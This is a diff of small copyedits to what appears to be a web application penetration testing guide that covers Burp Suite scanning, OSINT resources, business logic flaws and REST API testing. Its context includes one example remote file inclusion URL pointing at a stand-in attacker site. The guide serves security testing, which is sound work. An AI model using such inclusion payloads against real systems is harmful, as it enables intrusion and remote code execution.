@@ -146,7 +146,7 @@ Instead I'd like to point you towards some excellent resources on OSINT that I t
 
 * Michael Bazzell
   * <https://inteltechniques.com>
-  * [He Literally Wrote the Book on OSINT](https://www.amazon.com/dp/1984201573/ref=as_li_ss_tl?ie=UTF8&qid=1516984461&sr=8-10&keywords=open+source+intelligence+techniques&linkCode=sl1&tag=hookaround-20&linkId=1fc9d5a9d120f07b7ba934120ef485a2)
+  * [Open Source Intelligence Techniques](https://www.amazon.com/dp/1984201573/ref=as_li_ss_tl?ie=UTF8&qid=1516984461&sr=8-10&keywords=open+source+intelligence+techniques&linkCode=sl1&tag=hookaround-20&linkId=1fc9d5a9d120f07b7ba934120ef485a2)
 * Google Dorking
   * <https://www.exploit-db.com/google-hacking-database/>
 
@@ -461,7 +461,7 @@ I'll often use `Burp Intruder` to fuzz the `User-Agent` and `Referer` headers fo
   </tbody>
 </table>
 
-While you've been mapping the application and conducting the initial parts of discovery `Burp Passive Scanner` has been running in the background analyzing the target for vulnerabilities. These scan results should be reviewed prior to kicking off a scan with `Burp Active Scanner` with any particularly stand-out pages made note of so that you can do and investigate them further at a later time.
+While you've been mapping the application and conducting the initial parts of discovery `Burp Passive Scanner` has been running in the background analyzing the target for vulnerabilities. These scan results should be reviewed prior to kicking off a scan with `Burp Active Scanner` with any particularly stand-out pages made note of so that you can investigate them further at a later time.
 
 Due to the **very** long amount of time that it takes for `Burp Active Scanner` to complete I usually prefer to run it in bursts, reviewing scan results in between and making note of the results.
 
@@ -753,7 +753,7 @@ http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
 
 ### Business Logic
 
-Discovering flaws in business logic requires you, as the attacker, to have a decent fundemental understanding of the target application. Once you know the way the application is intended to be used you can start to reason how I could be exploited. When testing for business logic flaws refer back to areas of the application where you as the user are expected to complete a series of actions in a certain order (e.g. password reset form, order form, etc.) and try executing those actions out of order.
+Discovering flaws in business logic requires you, as the attacker, to have a decent fundemental understanding of the target application. Once you know the way the application is intended to be used you can start to reason how it could be exploited. When testing for business logic flaws refer back to areas of the application where you as the user are expected to complete a series of actions in a certain order (e.g. password reset form, order form, etc.) and try executing those actions out of order.
 
 Further, you should check if a user is able to enter unrealistic values into certain inputs fields within the application (e.g. a fitness app where a user is expected to enter the amount of miles run)?
 
@@ -828,9 +828,9 @@ Regardless, since REST uses the `http` protocol vs something like SOAP services 
 
 Please refer to these articles for additional resources when testing REST APIs.
 
-<https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf->
-<http://blog.isecurion.com/2017/10/10/penetration-testing-restful-web-services/>
-<https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet>
+* <https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf->
+* <http://blog.isecurion.com/2017/10/10/penetration-testing-restful-web-services/>
+* <https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet>
 
 #### Testing SOAP Web Services
 
